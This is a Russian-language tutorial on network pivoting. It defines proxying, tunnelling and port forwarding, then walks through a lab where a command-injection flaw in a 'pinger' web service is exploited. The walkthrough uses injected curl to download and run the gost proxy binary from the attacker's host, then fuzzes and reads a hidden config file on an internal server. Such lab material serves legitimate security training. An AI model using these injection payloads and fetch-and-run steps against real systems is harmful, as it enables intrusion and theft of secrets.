### Основные понятия

**Pivoting** (англ. Pivot – “точка опоры”) – техника, которая позволяет хакерам получить доступ к другой части сети,
используя
компьютер, который уже подвергся атаке. Эта техника может быть использована для обхода мер безопасности, установленных
на периметре сети, и получения доступа к данным и системам, которые находятся за этим периметром.

**Прокси-сервер** (англ. “Proxy”) — промежуточный сервер в компьютерных сетях, выполняющий роль посредника между
пользователем и целевым сервером, позволяющий клиентам как выполнять косвенные запросы к другим сетевым службам, так и
получать ответы.

**Туннелирование в компьютерных сетях** (англ. “Tunneling”) — процесс, в ходе которого создается логическое соединение
между двумя конечными точками посредством инкапсуляции различных протоколов.

**Переадресация портов** (англ. “Port Forwarding”) — в компьютерных сетях или сопоставление портов — приложение
преобразования сетевых адресов, которое перенаправляет запрос связи с одной комбинации адреса и номера порта на другую,
в то время как пакеты проходят через сетевой шлюз, такой как маршрутизатор или брандмауэр.

**Port2Port** (также известный как P2P) — это техника перенаправления сетевого трафика между двумя различными портами на
одном и том же компьютере или между двумя разными компьютерами.

**Port2Hostnet** — это техника перенаправления сетевого трафика через порт в сеть удаленного узла.

### Разбор базового примера

Вы получили доступ к системе ОС Linux, и ваша задача — изучить отдельные сервисы внутренней сети или получить к ней
доступ со своей рабочей машины.

Конкретнее:

Вы получили доступ на машину: jump
Ваша задача — получить удобный доступ к сервису: target:80

#### Ход действий

1. Запускаем лабораторный стенд:

> $ docker-compose up -d

2. Проверяем доступность сервиса pinger через web-интерфейс:


3. Проверяем возможность инъекции команд:

> 1.1.1.1; ls

4. Соберем информацию о сервисе:

> hostname -I

5. IP-адрес принадлежит локальной сети, попробуем найти в ней другие хосты, скрытые в локальной сети:

> curl 172.22.0.2

6. Наша задача – найти файл на web-сервере, который скрыт в локальной сети, используем для этого утилиту ffuf, но для
   этого необходимо стабильное соединение с целевым сервером через промежуточный хост.

Используем прокси из проекта Go simple tunnel: https://github.com/ginuerzh/gost

7. Скачиваем бинарный файл из релизов, выбираем сборку для Linux с amd64, например:

https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz

8. Подготовим веб-сервер для передачи этого файла на атакуемую машину:

        $ cd /tmp
        
        $ mkdir http; cd http
        
        $ wget https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz
        
        $ gunzip gost-linux-amd64-2.11.5.gz # распаковка архива с бинарником
        
        $ mv gost-linux-amd64-2.11.5 gost
        
        $ python3 -m http.server 3000

9. Определяем наш IP-адрес:

> $ ip a

10. Далее в браузере выполняем скачивание файла через интерфейс pinger:

> 1.1.1.1 | curl 172.20.10.7:3000/gost –output gost # IP-адрес нужно заменить на адрес вашего сетевого интерфейса

> chmod +x gost # выдача прав на исполнение

> ls -la

11. Запускаем gost в режиме прокси:

> 1.1.1.1 | ./gost -L=:1338

12. Настроим утилиту ffuf для использования прокси и используем её для обнаружения файлов на удаленном веб-сервере с IP
    172.22.0.2 в локальной сети:

> $ http_proxy=127.0.0.1:1338 ffuf -w ~/Repositories/YAWR/Web/files_and_directories/fuzz.txt -u http://172.22.0.2/FUZZ
> -fc
> 403

13. Получим файл config.inc~, прочтем его с помощью curl и получим секрет:

> 1.1.1.1 | curl 172.22.0.2/config.inc~

### Общие принципы

Существует множество подходов к пробросу трафика, зависящих от ОС, используемых утилит и различных ограничений. Их можно
разделить по критериям:

Используемых инструментов:

- Подходы, использующие внутренние инструменты ОС: ssh, nc, bash и пр.
- Подходы, использующие внешние утилиты: socat, meterpreter, gost и пр.


Методов сокрытия трафика и обхода ограничений:

- Стандартные протоколы, не использующие скрытие трафика: TCP, UDP, HTTPS, SSH, VPN
- Нестандартные протоколы, позволяющие обходить системы обнаружения, ограничения и скрывать наличие туннеля: ICMP, DNS,
HTTPS (в виде легитимных запросов к приложению)


Проблемы, присущие методам проброса трафика

- Нестабильность соединений
- Исключение возможности использовать протоколы ниже прикладного или транспортного уровня
- Детектирование зловредного трафика в сети
- Ограничение соединений между узлами, логическими сегментами сети, используемыми портами


